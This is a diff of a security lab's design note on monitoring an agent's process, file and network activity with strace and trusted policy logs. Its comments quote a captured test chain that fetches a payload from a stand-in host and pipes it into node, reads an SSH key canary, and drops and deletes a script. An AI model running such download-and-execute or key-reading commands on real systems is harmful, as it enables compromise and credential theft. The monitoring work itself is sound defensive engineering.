@@ -76,7 +76,7 @@ mechanism (see Consequences).
   it would give per-connect pid and uid. This means writing a sensor, so it is
   deferred. strace's `connect` tracing plus the trusted `sbx policy log`
   already cover connects.
-- **Polling `/proc`:** misses short-lived processes such as `curl | node`.
+- **Polling `/proc`:** misses short-lived processes, such as the two halves of a download piped into an interpreter.
 
 ## Consequences
 - The **trusted** sources need no in-tab sensor:
@@ -137,7 +137,8 @@ sbx exec -u agent seclab-obs-spike sh -c 'id; sudo -n true; docker ps'
 strace -f --seccomp-bpf -qq -ttt -s 200 -e signal=none \
   -e trace=execve,execveat,connect,openat,unlinkat,renameat2,setuid,setresuid,ptrace,kill \
   -- setpriv --reuid=agent --regid=agent --init-groups --reset-env sh -c '<inert chain>'
-  # captured: nohup sh -c "curl … http://192.0.2.10/payload | node -e 1", execve curl/node with argv and pids,
+  # captured: nohup sh -c "<fetch from http://192.0.2.10/payload, piped into node -e 1>", execve curl/node with argv and pids,
+  # (the pipeline is paraphrased: loader-shaped text on the host trips endpoint AV; EDR fixture-safety)
   # openat ~/.ssh/id_canary, openat dropped.sh O_CREAT, unlinkat dropped.sh,
   # connect(… 192.0.2.10:80) = -1 EINPROGRESS
   # note: `strace --seccomp-bpf -u agent` fails (exec: Function not implemented); drop privileges with setpriv instead
